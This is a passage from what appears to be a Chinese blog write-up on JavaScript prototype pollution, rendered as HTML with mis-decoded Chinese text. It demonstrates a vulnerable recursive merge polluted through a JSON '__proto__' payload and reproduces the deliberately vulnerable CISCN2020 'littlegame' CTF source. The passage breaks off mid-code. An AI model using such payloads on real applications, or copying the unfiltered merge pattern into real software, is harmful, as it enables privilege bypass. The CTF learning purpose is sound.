punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* è¿™ä¹ˆå†™ä¹Ÿä¸€æ ·function f() &#123;  this.a = 1;  this.b = 2;&#125;*/</span><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;a: 1, b: 2&#125;</span><span class="token comment">// åœ¨få‡½æ•°çš„åŸå‹ä¸Šå®šä¹‰å±æ€§</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">// ä¸è¦åœ¨ f å‡½æ•°çš„åŸå‹ä¸Šç›´æ¥å®šä¹‰ f.prototype = &#123;b:3,c:4&#125;;è¿™æ ·ä¼šç›´æ¥æ‰“ç ´åŸå‹é“¾</span><span class="token comment">// o.[[Prototype]] æœ‰å±æ€§ b å’Œ c</span><span class="token comment">//  (å…¶å®å°±æ˜¯ o.__proto__ æˆ–è€… o.constructor.prototype)</span><span class="token comment">// o.[[Prototype]].[[Prototype]] æ˜¯ Object.prototype.</span><span class="token comment">// æœ€åo.[[Prototype]].[[Prototype]].[[Prototype]]æ˜¯null</span><span class="token comment">// è¿™å°±æ˜¯åŸå‹é“¾çš„æœ«å°¾ï¼Œå³ nullï¼Œ</span><span class="token comment">// æ ¹æ®å®šä¹‰ï¼Œnull å°±æ˜¯æ²¡æœ‰ [[Prototype]]ã€‚</span><span class="token comment">// ç»¼ä¸Šï¼Œæ•´ä¸ªåŸå‹é“¾å¦‚ä¸‹:</span><span class="token comment">// &#123;a:1, b:2&#125; ---> &#123;b:3, c:4&#125; ---> Object.prototype---> null</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span class="token comment">// aæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span class="token comment">// bæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 2</span><span class="token comment">// åŸå‹ä¸Šä¹Ÿæœ‰ä¸€ä¸ª'b'å±æ€§ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¢«è®¿é—®åˆ°ã€‚</span><span class="token comment">// è¿™ç§æƒ…å†µè¢«ç§°ä¸º"å±æ€§é®è”½ (property shadowing)"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span><span class="token comment">// cæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// cæ˜¯o.[[Prototype]]çš„å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span class="token comment">// d æ˜¯ o çš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// d æ˜¯ o.[[Prototype]] çš„å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span><span class="token comment">// o.[[Prototype]].[[Prototype]] ä¸º nullï¼Œåœæ­¢æœç´¢</span><span class="token comment">// æ‰¾ä¸åˆ° d å±æ€§ï¼Œè¿”å› undefined</span></code></pre><p>è°ƒç”¨å¯¹è±¡å±æ€§æ—¶, ä¼šæŸ¥æ‰¾å±æ€§ï¼Œå¦‚æœæœ¬èº«æ²¡æœ‰ï¼Œåˆ™ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ„é€ å‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œä¹Ÿæœ‰<code>__proto__</code>ï¼Œé‚£ä¹ˆä¼šå»<code>__proto__</code>çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œä¸€ç›´åˆ°null</p><h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>è¿™é‡Œé‡‡ç”¨PğŸ®çš„ä¾‹å­æ¥ç®€å•åˆ†æä¸€ä¸‹</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>bar<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar æ­¤æ—¶ä¸º1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// æŸ¥çœ‹zoo.bar</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605193352763.png" alt loading="lazy"></p><p>æ ¹æ®ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>zoo.bar</code>æ‰“å°å‡ºæ¥çš„æ˜¯2ï¼Œfooæ˜¯ä¸€ä¸ªobjectå®ä¾‹ï¼Œæˆ‘ä»¬ä»¤<code>foo.__proto__.bar = 2</code>æ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†<code>Object</code>è¿™ä¸ªç±»ï¼Œå¢åŠ äº†ä¸€ä¸ªå±æ€§<code>bar</code>å€¼ä¸º2ï¼Œç„¶åæˆ‘ä»¬æœ‰åˆ›å»ºäº†ä¸€ä¸ªobjectç±»zooï¼Œåˆ™zooå¯¹è±¡è‡ªç„¶æœ‰ä¸€ä¸ªbarå±æ€§</p><blockquote><p>åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p></blockquote><h3 id="åˆ©ç”¨æ‰‹æ®µ"><a href="#åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="åˆ©ç”¨æ‰‹æ®µ"></a>åˆ©ç”¨æ‰‹æ®µ</h3><ol><li>å¸¸å‘ç”Ÿåœ¨<code>merge</code> ç­‰å¯¹è±¡é€’å½’åˆå¹¶æ“ä½œ</li><li>å¯¹è±¡å…‹éš†</li><li>è·¯å¾„æŸ¥æ‰¾å±æ€§ç„¶åä¿®æ”¹å±æ€§çš„æ—¶å€™</li></ol><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 1,2</span>o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 2</span></code></pre><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨<code>JSON.parse</code>è€Œä¸ç›´æ¥ä½¿ç”¨<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code></p><p>å¦‚æœä¸ä½¿ç”¨<code>JSON.parse</code>ï¼Œåˆ™åŸå‹é“¾å¹¶ä¸ä¼šè¢«æ±¡æŸ“ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605195054300.png" alt loading="lazy"></p><p>å› ä¸ºæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œæ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="CISCN2020-littlegame"><a href="#CISCN2020-littlegame" class="headerlink" title="CISCN2020 littlegame"></a>CISCN2020 littlegame</h4><p>2020å¹´çš„å›½èµ›é¢˜ï¼Œå½“æ—¶ä¿å­˜äº†ä¸€ä»½é¢˜ç›®æºç ï¼Œäºæ˜¯è¿™é‡Œæ‹¿å‡ºæ¥å¤ç°ä¸€ä¸‹</p><p>index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> setFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">COMMODITY</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sword"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// Times have changed</span>    <span class="token string">"gun"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"200"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">MOBS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Lv1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv3"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"15"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv4"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"30"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv5"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"65"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv6"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">BOSS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Times have not changed</span>    <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"201"</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"password1"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p1<span class="token punctuation">,</span>    <span class="token string">"password2"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p2<span class="token punctuation">,</span>    <span class="token string">"password3"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p3<span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/BuyWeapon'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/EarnBounty'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/ChallengeBOSS'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/DeveloperControlPanel"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Wrong password!Are you Admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"HP"</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>        <span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's begin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/Privilege"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Why not ask witch for help?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> value <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setFn</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's have a check!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>å®¡è®¡ä»£ç ï¼Œflagåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œéœ€è¦è®¿é—®<code>DeveloperControlPanel</code>è¿™ä¸ªè·¯ç”±ï¼Œå¹¶ä¸”éœ€è¦<code>Admin[key] === password</code>ï¼Œç®€å•æ¥è¯´æˆ‘ä»¬éœ€è¦çŸ¥é“p1ã€p2ã€p3ä¸­çš„ä»»æ„ä¸€ä¸ªå¯†ç å³å¯æ‹¿åˆ°flag</p><p>æ ¹æ®æç¤ºçœ‹åˆ°<code>Privilege</code>è·¯ç”±ï¼Œè¿™é‡Œè®¿é—®æ—¶<code>knight</code>è¿™ä¸ª<code>session</code>æ²¡å®šä¹‰ï¼Œåˆ™é‡å®šå‘åˆ°<code>SpawnPoint</code>åˆ›å»ºä¸€ä¸ªï¼Œéšåå†è®¿é—®çš„æ—¶å€™éœ€è¦æºå¸¦<code>NewAttributeKey</code>å’Œ<code>NewAttributeValue</code>ä¸¤ä¸ªå‚æ•°ï¼Œæ¥è¿›è¡Œ<code>setFn</code>æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°<code>setFn</code>åœ¨å¤´éƒ¨å®šä¹‰<code>const setFn = require(&#39;set-value&#39;);</code></p><ul><li><p><a href="https://www.npmjs.com/package/set-value">set-value</a> : Set nested properties on an object using dot notation. / ä½¿ç”¨ç‚¹è¡¨ç¤ºæ³•åœ¨å¯¹è±¡ä¸Šè®¾ç½®åµŒå¥—å±æ€§ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'a.b.c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//=> &#123; a: &#123; b: &#123; c: 'd' &#125; &#125; &#125;</span></code></pre></li></ul><p>è·Ÿè¿›åˆ°è¿™ä¸ªåŒ…çš„æºä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span> isPlain <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-plain-object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> isArray <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isArray <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> path <span class="token operator">!==</span> <span class="token 